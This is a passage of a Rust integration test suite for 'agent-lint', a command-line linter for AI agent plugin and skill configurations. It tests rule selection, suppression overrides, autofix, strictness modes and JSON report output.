    assert_eq!(report["notices"][0]["severity"], "error");
    let message = report["notices"][0]["message"].as_str().unwrap();
    assert!(message.starts_with("agent-lint.toml:"));
    assert!(!message.contains(tmp.path().to_string_lossy().as_ref()));

    let text = run_in(tmp.path(), &["."]);
    assert_eq!(text.status.code(), Some(2));
    assert!(stderr(&text).contains(tmp.path().to_string_lossy().as_ref()));
}

#[test]
fn json_setup_failure_is_one_document_and_exit_two() {
    let tmp = tempfile::tempdir().unwrap();
    let missing = tmp.path().join("missing");
    let output = run(&["--format", "json", missing.to_string_lossy().as_ref()]);
    assert_eq!(output.status.code(), Some(2));
    let report = json(&output);
    assert_eq!(report["status"], "usage-error");
    assert_eq!(report["notices"][0]["kind"], "setup");
}

#[test]
fn json_invalid_only_is_schema_valid_and_preserves_prior_notices() {
    let tmp = tempfile::tempdir().unwrap();
    let target = tmp.path().to_string_lossy().into_owned();

    for only in [
        "NOT_A_RULE",
        "S012",
        "S013",
        "name-reserved-word",
        "name-has-xml",
        "K001",
        "slack-fallback-mismatch",
        "Q006,",
        ",Q006",
    ] {
        let output = run(&["--format", "json", "--only", only, &target]);
        assert_eq!(output.status.code(), Some(2), "--only {only}");
        let report = json(&output);
        assert_eq!(report["status"], "usage-error");
        assert!(report["selected_rules"].is_null());
        assert_eq!(report["notices"][0]["kind"], "repository-root");
        assert_eq!(report["notices"][1]["kind"], "usage");
        let message = report["notices"][1]["message"].as_str().unwrap();
        if matches!(only, "Q006," | ",Q006") {
            assert!(message.contains("empty rule identifier"));
        } else {
            assert!(message.contains(&format!("invalid rule identifier '{only}'")));
        }
    }

    for (mode, mode_args) in [
        ("normal", vec![]),
        ("pedantic", vec!["--pedantic"]),
        ("all", vec!["--all"]),
        ("autofix", vec!["--autofix"]),
    ] {
        for only in [
            "NOT_A_RULE",
            "S012",
            "S013",
            "name-reserved-word",
            "name-has-xml",
            "K001",
            "slack-fallback-mismatch",
        ] {
            let mut args = mode_args.clone();
            args.extend(["--only", only, &target]);
            let text = run(&args);
            assert_eq!(text.status.code(), Some(2), "{mode}: --only {only}");
            assert!(
                stderr(&text).contains(&format!("invalid rule identifier '{only}'")),
                "{mode}: --only {only}: {}",
                stderr(&text)
            );
        }
    }
}

#[test]
fn larch_slack_fallback_scripts_produce_no_built_in_slack_diagnostic() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"slack-plugin","description":"Test plugin","version":"1.0.0"}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/marketplace.json"),
        r#"{"name":"slack-marketplace","owner":{"name":"test"},"plugins":[{"name":"slack-plugin","source":"./","description":"Test plugin"}]}"#,
    )
    .unwrap();
    std::fs::create_dir_all(tmp.path().join("scripts")).unwrap();
    std::fs::write(
        tmp.path().join("scripts/slack.sh"),
        "#!/bin/bash\nTOKEN=${LARCH_SLACK_BOT_TOKEN:-default}\nCHANNEL=${LARCH_SLACK_CHANNEL_ID:-x}\nUSER=${LARCH_SLACK_USER_ID:-y}\n",
    )
    .unwrap();

    for args in [
        vec!["--format", "json", "."],
        vec!["--format", "json", "--pedantic", "."],
        vec!["--format", "json", "--all", "."],
    ] {
        let output = run_in(tmp.path(), &args);
        let report = json(&output);
        let diagnostics = report["diagnostics"].as_array().unwrap();
        assert!(
            diagnostics.iter().all(|d| {
                let code = d["code"].as_str().unwrap_or("");
                let name = d["name"].as_str().unwrap_or("");
                code != "K001" && name != "slack-fallback-mismatch"
            }),
            "unexpected Slack diagnostic for {args:?}: {report}"
        );
    }
}

#[test]
fn angle_bracket_skill_names_report_s010_once_and_are_never_autofixed() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/invalid/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    let content =
        "---\nname: invalid-<tag>\ndescription: Use when testing invalid skill names\n---\nBody\n";
    std::fs::write(&skill, content).unwrap();

    for (mode, args) in [
        ("normal", vec!["--only", "S010", "."]),
        ("pedantic", vec!["--pedantic", "--only", "S010", "."]),
        ("all", vec!["--all", "--only", "S010", "."]),
        ("autofix", vec!["--autofix", "--only", "S010", "."]),
    ] {
        let output = run_in(tmp.path(), &args);
        let output_stderr = stderr(&output);
        assert_eq!(output.status.code(), Some(1), "{mode}: {output_stderr}");
        assert_eq!(
            output_stderr.matches("S010/name-invalid-chars").count(),
            1,
            "{mode}: {output_stderr}"
        );
        assert_eq!(std::fs::read_to_string(&skill).unwrap(), content, "{mode}");
    }
}

#[test]
fn vendor_and_skill_names_are_valid_in_every_strictness_mode() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    for name in ["claude-api", "anthropic-tools", "skill", "skill-creator"] {
        let skill = tmp.path().join(format!(".claude/skills/{name}/SKILL.md"));
        std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
        std::fs::write(
            skill,
            format!(
                "---\nname: {name}\ndescription: Use when testing valid skill names\n---\nBody\n"
            ),
        )
        .unwrap();
    }

    for (mode, args) in [
        ("normal", vec!["--only", "S010", "."]),
        ("pedantic", vec!["--pedantic", "--only", "S010", "."]),
        ("all", vec!["--all", "--only", "S010", "."]),
    ] {
        let output = run_in(tmp.path(), &args);
        assert!(output.status.success(), "{mode}: {}", stderr(&output));
        assert!(!stderr(&output).contains("S010/name-invalid-chars"));
    }
}

#[test]
fn json_repository_root_notice_makes_an_otherwise_clean_run_warning_status() {
    let tmp = tempfile::tempdir().unwrap();
    let output = run(&["--format", "json", tmp.path().to_string_lossy().as_ref()]);
    assert!(output.status.success());
    let report = json(&output);
    assert_eq!(report["counts"]["warnings"], 0);
    assert_eq!(report["status"], "warnings");
    assert_eq!(report["notices"][0]["kind"], "repository-root");
}

#[test]
fn json_autofix_serializes_only_the_final_validation() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    write_skill(tmp.path(), "fixed", "http://current.corp");

    let output = run_in(tmp.path(), &["--autofix", "--format", "json", "."]);
    assert!(output.status.success());
    assert!(stderr(&output).contains("fixed[S031/non-https-url]"));
    let report = json_document(&output);
    assert!(
        !report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .any(|diagnostic| diagnostic["code"] == "S031")
    );
    let fixed = std::fs::read_to_string(tmp.path().join(".claude/skills/fixed/SKILL.md")).unwrap();
    assert!(fixed.contains("https://current.corp"));
}

#[test]
fn text_and_json_strictness_modes_validate_and_preserve_gating() {
    for format in ["text", "json"] {
        for strictness in [None, Some("--pedantic"), Some("--all")] {
            let tmp = tempfile::tempdir().unwrap();
            init_git(tmp.path());
            std::fs::write(tmp.path().join("budget.md"), "first line\nsecond line\n").unwrap();
            std::fs::write(
                tmp.path().join("agent-lint.toml"),
                r#"[lint]
[[lint.prompt-source-budgets]]
name = "budget"
roots = ["budget.md"]
root-max-lines = 1
"#,
            )
            .unwrap();
            let mut args = vec!["--format", format];
            if let Some(strictness) = strictness {
                args.push(strictness);
            }
            args.push(".");
            let output = run_in(tmp.path(), &args);
            let expected_exit = if strictness.is_none() { 0 } else { 1 };
            assert_eq!(output.status.code(), Some(expected_exit));
            if format == "json" {
                let report = json(&output);
                let expected_status = if strictness.is_none() {
                    "warnings"
                } else {
                    "errors"
                };
                assert_eq!(report["status"], expected_status);
            } else {
                assert!(stderr(&output).contains("Lint:"));
            }
        }
    }
}

#[test]
fn json_unused_override_is_a_structured_notice() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = ["missing.md"]
suppress = ["M001"]
reason = "stale exception"
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert!(output.status.success());
    let report = json(&output);
    assert_eq!(report["notices"][0]["kind"], "unused-override");
    assert_eq!(report["notices"][0]["severity"], "warning");
    assert!(
        !report["notices"][0]["message"]
            .as_str()
            .unwrap()
            .starts_with("warning[")
    );
    assert_eq!(report["counts"]["notices"], 1);
}

#[test]
fn json_counts_suppressed_diagnostics_without_rendering_them() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    write_skill(tmp.path(), "suppressed", "http://legacy.corp");
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/skills/suppressed/SKILL.md"]
suppress = ["S031"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert!(output.status.success());
    let report = json(&output);
    assert_eq!(report["counts"]["suppressed"], 1);
    assert!(
        !report["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .any(|diagnostic| diagnostic["code"] == "S031")
    );
}

#[test]
fn multiple_paths_are_a_usage_error() {
    let output = run(&["one", "two"]);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).contains("unexpected argument found"));
}

#[test]
fn per_file_override_suppresses_one_file_but_not_another_and_counts_it() {
    let tmp = tempfile::tempdir().unwrap();
    write_skill(tmp.path(), "suppressed", "http://legacy.corp");
    write_skill(tmp.path(), "reported", "http://current.corp");
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/skills/suppressed/SKILL.md"]
suppress = ["S031"]
reason = "legacy endpoint is externally owned"
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    assert!(stderr.contains("S031/non-https-url"), "stderr: {stderr}");
    assert!(stderr.contains(".claude/skills/reported/SKILL.md"));
    assert!(!stderr.contains(".claude/skills/suppressed/SKILL.md: non-HTTPS"));
    assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
    assert!(!stderr.contains("unused-override"), "stderr: {stderr}");
}

#[cfg(unix)]
#[test]
fn basic_mode_hook_autofix_is_idempotent() {
    use std::os::unix::fs::PermissionsExt;

    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude/hooks")).unwrap();
    let script = tmp.path().join(".claude/hooks/check.py");
    std::fs::write(&script, "#!/usr/bin/env python3\n").unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o644)).unwrap();
    std::fs::write(
        tmp.path().join(".claude/settings.json"),
        r#"{"hooks":[{"command":"\"${CLAUDE_PROJECT_DIR}\"/.claude/hooks/check.py"}]}"#,
    )
    .unwrap();

    let first = run_in(tmp.path(), &["--autofix", "--only", "H005", "."]);
    assert!(first.status.success(), "stderr: {}", stderr(&first));
    assert!(stderr(&first).contains("fixed[H005/hook-not-executable]"));
    assert_ne!(
        std::fs::metadata(&script).unwrap().permissions().mode() & 0o111,
        0
    );

    let second = run_in(tmp.path(), &["--autofix", "--only", "H005", "."]);
    assert!(second.status.success(), "stderr: {}", stderr(&second));
    assert!(!stderr(&second).contains("fixed[H005/hook-not-executable]"));
}

#[test]
fn autofix_leaves_suppressed_file_unchanged_and_fixes_unsuppressed_file() {
    let tmp = tempfile::tempdir().unwrap();
    let suppressed_before = write_skill(tmp.path(), "suppressed", "http://legacy.corp");
    write_skill(tmp.path(), "fixed", "http://current.corp");
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/skills/suppressed/SKILL.md"]
suppress = ["S031"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--autofix", "."]);
    let stderr = stderr(&output);
    assert!(output.status.success(), "stderr: {stderr}");
    assert_eq!(
        std::fs::read_to_string(tmp.path().join(".claude/skills/suppressed/SKILL.md")).unwrap(),
        suppressed_before
    );
    let fixed = std::fs::read_to_string(tmp.path().join(".claude/skills/fixed/SKILL.md")).unwrap();
    assert!(fixed.contains("https://current.corp"), "content: {fixed}");
    assert!(!fixed.contains("http://current.corp"));
    assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
}

#[test]
fn unused_override_warning_is_emitted_once_on_final_autofix_pass() {
    let tmp = tempfile::tempdir().unwrap();
    write_skill(tmp.path(), "clean", "https://current.corp");
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/skills/missing/SKILL.md"]
suppress = ["S031"]
reason = "stale exception"
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--autofix", "."]);
    let stderr = stderr(&output);
    assert!(output.status.success(), "stderr: {stderr}");
    assert_eq!(stderr.matches("config/unused-override").count(), 1);
    assert!(stderr.contains("S031/non-https-url"));
    assert!(stderr.contains(".claude/skills/missing/SKILL.md"));
    assert!(stderr.contains("stale exception"));
}

#[test]
fn fixed_missing_target_uses_its_logical_subject_path() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude-plugin/plugin.json"]
suppress = ["M001"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["."]);
    let stderr = stderr(&output);
    // M001 (plugin-json-missing) is a fixed-path check: its logical subject is
    // `.claude-plugin/plugin.json` even though the file is absent, so the per-file
    // override matches and suppresses it. With M001 the only error and no A001
    // for the agentless plugin (narrowed contract), the run passes cleanly while
    // still reporting the targeted suppression.
    assert_eq!(output.status.code(), Some(0), "stderr: {stderr}");
    assert!(!stderr.contains("M001/plugin-json-missing"));
    assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
    assert!(!stderr.contains("unused-override"), "stderr: {stderr}");
}

#[test]
fn a001_declared_missing_agent_path_honors_per_file_override() {
    // The narrowed A001 carries the declared path as its subject, so a per-file
    // override on that path suppresses it (and is therefore not "unused").
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name": "p", "version": "1.0.0", "agents": "./custom-agents"}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\"custom-agents\"]\nsuppress = [\"A001\"]\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["."]);
    let stderr = stderr(&output);
    assert!(
        !stderr.contains("A001/agents-dir-missing"),
        "stderr: {stderr}"
    );
    assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
    assert!(!stderr.contains("unused-override"), "stderr: {stderr}");
}

#[test]
fn all_mode_ignores_per_file_suppression() {
    let tmp = tempfile::tempdir().unwrap();
    write_skill(tmp.path(), "suppressed", "http://legacy.corp");
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/skills/suppressed/SKILL.md"]
suppress = ["S031"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--all", "."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    assert!(stderr.contains("S031/non-https-url"), "stderr: {stderr}");
    assert!(stderr.contains(".claude/skills/suppressed/SKILL.md"));
    assert!(!stderr.contains("suppressed)"));
    assert!(!stderr.contains("unused-override"));
}

#[test]
fn override_only_config_reports_an_unused_entry_without_a_detected_surface() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = ["missing.md"]
suppress = ["M001"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["."]);
    let stderr = stderr(&output);
    assert!(output.status.success(), "stderr: {stderr}");
    assert!(stderr.contains("config/unused-override"));
    assert!(stderr.contains("missing.md"));
}

#[test]
fn only_accepts_codes_names_commas_repetition_and_orders_by_registry() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"hooks":"./config/missing.json"}"#,
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
        &[
            "--only",
            "H001,plugin-field-missing",
            "--only",
            "hooks-json-missing",
            ".",
        ],
    );
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    assert_eq!(stderr.matches("M003/plugin-field-missing").count(), 1);
    assert_eq!(stderr.matches("H001/hooks-json-missing").count(), 1);
    let manifest = stderr.find("M003/plugin-field-missing").unwrap();
    let hooks = stderr.find("H001/hooks-json-missing").unwrap();
    assert!(manifest < hooks, "stderr: {stderr}");
    assert!(!stderr.contains("M005/marketplace-json-missing"));
}

#[test]
fn only_rejects_unknown_and_empty_identifiers_as_usage_errors() {
    for (argument, invalid) in [
        ("X999", "X999"),
        ("M001,,H001", "empty rule identifier"),
        ("", "empty rule identifier"),
    ] {
        let output = run(&["--only", argument]);
        let stderr = stderr(&output);
        assert_eq!(output.status.code(), Some(2), "stderr: {stderr}");
        assert!(stderr.contains(invalid), "stderr: {stderr}");
    }
}

#[test]
fn only_does_not_bypass_invalid_agent_lint_configuration() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"not-a-rule\"]\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--only", "M001", "."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(2), "stderr: {stderr}");
    assert!(stderr.contains("not-a-rule"), "stderr: {stderr}");
}

#[test]
fn only_preserves_normal_pedantic_and_all_severity() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();

    let normal = run_in(tmp.path(), &["--only", "G005", "."]);
    let normal_stderr = stderr(&normal);
    assert!(normal.status.success(), "stderr: {normal_stderr}");
    assert!(
        normal_stderr.contains("warning[G005/security-policy-missing]"),
        "stderr: {normal_stderr}"
    );

    let pedantic = run_in(tmp.path(), &["--pedantic", "--only", "G005", "."]);
    let pedantic_stderr = stderr(&pedantic);
    assert_eq!(pedantic.status.code(), Some(1), "stderr: {pedantic_stderr}");
    assert!(
        pedantic_stderr.contains("error[G005/security-policy-missing]"),
        "stderr: {pedantic_stderr}"
    );

    let all = run_in(tmp.path(), &["--all", "--only", "G005", "."]);
    let all_stderr = stderr(&all);
    assert_eq!(all.status.code(), Some(1), "stderr: {all_stderr}");
    assert!(
        all_stderr.contains("error[G005/security-policy-missing]"),
        "stderr: {all_stderr}"
    );
    assert!(!all_stderr.contains("M001/plugin-json-missing"));
}

#[test]
fn g005_accepts_security_policy_in_github_directory() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::create_dir(tmp.path().join(".github")).unwrap();
    std::fs::write(
        tmp.path().join(".github/SECURITY.md"),
        "# Security Policy\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "G005", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let report = json(&output);
    assert_eq!(report["status"], "clean");
    assert_eq!(report["diagnostics"], serde_json::json!([]));
}

#[test]
fn g005_missing_policy_reports_actionable_suggestion() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "G005", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostic = &report["diagnostics"][0];
    assert_eq!(diagnostic["code"], "G005");
    assert_eq!(diagnostic["name"], "security-policy-missing");
    assert_eq!(diagnostic["severity"], "warning");
    assert_eq!(diagnostic["subject_path"], "SECURITY.md");
    let suggestion = diagnostic["suggestion"]
        .as_str()
        .expect("G005 emits a suggestion");
    assert!(suggestion.contains(".github/"), "suggestion: {suggestion}");
    assert!(suggestion.contains("docs/"), "suggestion: {suggestion}");
}

#[test]
fn g005_accepts_security_policy_in_docs_directory() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::create_dir(tmp.path().join("docs")).unwrap();
    std::fs::write(tmp.path().join("docs/SECURITY.md"), "# Security Policy\n").unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "G005", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let report = json(&output);
    assert_eq!(report["status"], "clean");
    assert_eq!(report["diagnostics"], serde_json::json!([]));
}

#[test]
fn g005_directory_named_security_md_still_warns() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    // A directory named SECURITY.md is not a committed policy file.
    std::fs::create_dir(tmp.path().join("SECURITY.md")).unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "G005", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostic = &report["diagnostics"][0];
    assert_eq!(diagnostic["code"], "G005");
    assert_eq!(diagnostic["name"], "security-policy-missing");
    assert_eq!(diagnostic["subject_path"], "SECURITY.md");
}

#[test]
fn g005_per_file_override_suppresses_on_security_md_subject() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\n[[lint.overrides]]\nfiles = [\"SECURITY.md\"]\nsuppress = [\"G005\"]\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--only", "G005", "."]);
    let stderr = stderr(&output);
    assert!(output.status.success(), "stderr: {stderr}");
    assert!(
        !stderr.contains("security-policy-missing"),
        "per-file override on SECURITY.md must suppress G005: {stderr}"
    );
    assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
}

#[test]
fn only_preserves_configured_severity() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nwarn = [\"M001\"]\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--only", "M001", "."]);
    let stderr = stderr(&output);
    assert!(output.status.success(), "stderr: {stderr}");
    assert!(
        stderr.contains("warning[M001/plugin-json-missing]"),
        "stderr: {stderr}"
    );
}

#[test]
fn only_preserves_global_suppression_except_in_all_mode() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        "[lint]\nsuppress = [\"G005\"]\n",
    )
    .unwrap();

    for args in [
        vec!["--only", "G005", "."],
        vec!["--pedantic", "--only", "G005", "."],
    ] {
        let output = run_in(tmp.path(), &args);
        let stderr = stderr(&output);
        assert!(output.status.success(), "stderr: {stderr}");
        assert!(!stderr.contains("G005/security-policy-missing"));
        assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
    }

    let all = run_in(tmp.path(), &["--all", "--only", "G005", "."]);
    let all_stderr = stderr(&all);
    assert_eq!(all.status.code(), Some(1), "stderr: {all_stderr}");
    assert!(all_stderr.contains("error[G005/security-policy-missing]"));
    assert!(!all_stderr.contains("suppressed)"));
}

#[test]
fn only_preserves_per_file_suppression() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude-plugin/plugin.json"]
suppress = ["M001"]
"#,
    )
    .unwrap();

    for args in [
        vec!["--only", "M001", "."],
        vec!["--pedantic", "--only", "M001", "."],
    ] {
        let output = run_in(tmp.path(), &args);
        let stderr = stderr(&output);
        assert!(output.status.success(), "stderr: {stderr}");
        assert!(!stderr.contains("M001/plugin-json-missing"));
        assert!(stderr.contains("(1 suppressed)"), "stderr: {stderr}");
    }

    let all = run_in(tmp.path(), &["--all", "--only", "M001", "."]);
    let all_stderr = stderr(&all);
    assert_eq!(all.status.code(), Some(1), "stderr: {all_stderr}");
    assert!(all_stderr.contains("error[M001/plugin-json-missing]"));
    assert!(!all_stderr.contains("suppressed)"));
}

#[test]
fn focused_skill_name_contract_preserves_policy_and_json_metadata() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".cursor/skills/Invalid/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        skill,
        "---\nname: Invalid\ndescription: A valid skill description here\n---\nBody\n",
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".cursor/skills/Invalid/SKILL.md"]
suppress = ["S010"]
"#,
    )
    .unwrap();

    for args in [
        vec!["--format", "json", "--only", "S010", "."],
        vec!["--format", "json", "--pedantic", "--only", "S010", "."],
    ] {
        let output = run_in(tmp.path(), &args);
        assert!(output.status.success(), "stderr: {}", stderr(&output));
        let report = json(&output);
        assert_eq!(report["counts"]["suppressed"], 1);
        assert!(report["diagnostics"].as_array().unwrap().is_empty());
    }

    let output = run_in(
        tmp.path(),
        &["--format", "json", "--all", "--only", "S010", "."],
    );
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1);
    let diagnostic = &diagnostics[0];
    assert_eq!(diagnostic["code"], "S010");
    assert_eq!(
        diagnostic["subject_path"],
        ".cursor/skills/Invalid/SKILL.md"
    );
    assert_eq!(diagnostic["location"]["start"]["line"], 2);
    assert_eq!(diagnostic["evidence"], "Invalid");
    assert_eq!(
        diagnostic["suggestion"],
        "use only lowercase ASCII letters, digits, and single hyphens"
    );
}

#[test]
fn agent_stop_missing_respects_strictness_only_and_per_file_suppression() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude/agents")).unwrap();
    std::fs::write(
        tmp.path().join(".claude/agents/reviewer.md"),
        "---\nname: reviewer\ndescription: Reviews changes and makes targeted repairs when needed\ntools: Bash\n---\nInvestigate the failure and implement a repair.\n",
    )
    .unwrap();

    let normal = run_in(tmp.path(), &["--only", "A029", "."]);
    let normal_stderr = stderr(&normal);
    assert!(normal.status.success(), "stderr: {normal_stderr}");
    assert!(normal_stderr.contains("warning[A029/agent-stop-missing]"));

    let json_output = run_in(tmp.path(), &["--format", "json", "--only", "A029", "."]);
    assert!(
        json_output.status.success(),
        "stderr: {}",
        stderr(&json_output)
    );
    let report = json(&json_output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1);
    assert_eq!(
        diagnostics[0]["suggestion"],
        "add either a concrete bound or a concrete failure outcome"
    );

    for strictness in ["--pedantic", "--all"] {
        let output = run_in(tmp.path(), &[strictness, "--only", "A029", "."]);
        let output_stderr = stderr(&output);
        assert_eq!(output.status.code(), Some(1), "stderr: {output_stderr}");
        assert!(output_stderr.contains("error[A029/agent-stop-missing]"));
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/agents/reviewer.md"]
suppress = ["agent-stop-missing"]
"#,
    )
    .unwrap();
    for args in [
        vec!["--only", "A029", "."],
        vec!["--pedantic", "--only", "A029", "."],
    ] {
        let output = run_in(tmp.path(), &args);
        let output_stderr = stderr(&output);
        assert!(output.status.success(), "stderr: {output_stderr}");
        assert!(!output_stderr.contains("A029/agent-stop-missing"));
        assert!(output_stderr.contains("(1 suppressed)"));
    }
}

#[test]
fn agent_evidence_contracts_preserve_focused_policy_and_per_file_suppression() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude/agents")).unwrap();
    std::fs::write(
        tmp.path().join(".claude/agents/reviewer.md"),
        "---\nname: reviewer\ndescription: Reviews changes and verifies file-backed evidence\ntools: Bash\n---\nUse the Read tool before reporting.\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "A012", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1);
    assert_eq!(diagnostics[0]["code"], "A012");
    assert_eq!(diagnostics[0]["subject_path"], ".claude/agents/reviewer.md");
    assert_eq!(diagnostics[0]["location"]["start"]["line"], 6);
    assert_eq!(
        diagnostics[0]["suggestion"],
        "declare Read in tools or remove the explicit Read-tool mandate"
    );

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude/agents/reviewer.md"]
suppress = ["agent-read-mismatch"]
reason = "Read is supplied by the controlled runtime"
"#,
    )
    .unwrap();
    let suppressed = run_in(tmp.path(), &["--only", "A012", "."]);
    assert!(
        suppressed.status.success(),
        "stderr: {}",
        stderr(&suppressed)
    );
    assert!(stderr(&suppressed).contains("(1 suppressed)"));
}

#[test]
fn q005_and_a029_share_bound_recognition_through_the_real_binary() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude/agents")).unwrap();
    std::fs::write(
        tmp.path().join(".claude/agents/reviewer.md"),
        "---\nname: reviewer\ndescription: Reviews changes and makes targeted repairs when needed\ntools: Bash\n---\nRetry until success, but stop after 3 attempts.\n",
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
